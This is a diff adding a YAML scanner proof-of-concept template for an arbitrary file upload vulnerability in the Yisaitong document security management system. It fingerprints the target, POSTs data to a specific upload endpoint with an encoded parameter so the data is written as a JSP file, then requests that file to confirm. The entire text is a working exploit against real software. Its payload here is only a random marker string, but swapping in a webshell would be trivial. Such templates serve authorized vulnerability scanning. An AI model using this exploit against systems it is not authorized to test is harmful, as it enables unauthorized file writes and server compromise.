@@ -1,0 +1,26 @@
+id: poc-yaml-yisaitong-arbitrary-file-upload
+info:
+  name: 易赛通文档安全管理系统任意文件上传漏洞
+  severity: high
+  tags:
+  - 文件上传
+  finger: 易赛通
+  osprey-id: vb_2022_0109
+variables:
+  r_rand_str: random_str(32)
+requests:
+- method: GET
+  path: /
+  expression: contains(body, "CDGServerLanguage")
+- method: POST
+  path: /CDGServer3/UploadFileFromClientServiceForClient?AHECJIIACHMDAPKFAPLPFJPJHAHIDMFNKENDCLKLHFEKNDMAHGHOJBPEBEBCNIODHIKOBGFOMCPECDMKOHHIKOIPOPMMIOJDEACILAMPMLNLMELAMHAGGJMDLBCGCECCPKMMEIOKCBDGKHPDPFMLNPEKJHDEHNHFHILECBAJELDJNDBAEHOIIKDMHGOEHBIBHCAMDBBLHJGNCCPKDGLABEFHOKDPAKDCMIOHIFJAGCBPOMIKLMGBAGCNBGEGNKGABCOKEIJCMOMKEAKDALJEHMEIPHLLBJPCJIIPAFACIJKGABAFFDEDCAHOALGIGLKBFIFBFCGGBJFOGEGG
+  headers:
+    Content-Type: application/xml;charset=UTF-8
+  data: '{{.r_rand_str}}'
+  expression: status_code == 200
+- method: GET
+  path: /CDGServer3/favicat.jsp
+  headers:
+    Content-Type: application/xml;charset=UTF-8
+  expression: contains(body, r_rand_str)
+transport: http
